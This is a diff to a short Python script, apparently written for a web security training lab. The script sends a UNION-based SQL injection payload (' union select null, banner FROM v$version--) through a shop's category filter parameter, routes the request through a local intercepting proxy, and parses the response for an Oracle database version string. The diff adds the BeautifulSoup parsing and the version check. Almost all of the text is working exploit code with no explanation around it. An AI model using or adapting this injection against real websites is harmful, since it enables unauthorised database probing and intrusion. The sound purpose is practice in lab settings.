@@ -2,6 +2,7 @@ import requests
 import sys
 import urllib3
 import re
+from bs4 import BeautifulSoup
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}
@@ -9,12 +10,17 @@ proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}
 
 
 def exploit_sqli_version(url):
-    path = 'filter?category=Accessories'
+    path = 'filter?category=Gifts'
     sqli_payload = "' union select null, banner FROM v$version--"
     r = requests.get(url + path + sqli_payload, verify=False, proxies=proxies)
     res = r.text
     soup = BeautifulSoup(r.text, 'html.parser')
-
+    version = soup.find(text = re.compile('.*\d{1,2}\.\d{1,2}\.\d{1,2}.*'))
+    if version is None:
+        return False
+    else:
+        print(f'[+] The database version is: {version}')
+        return True
 
 
 
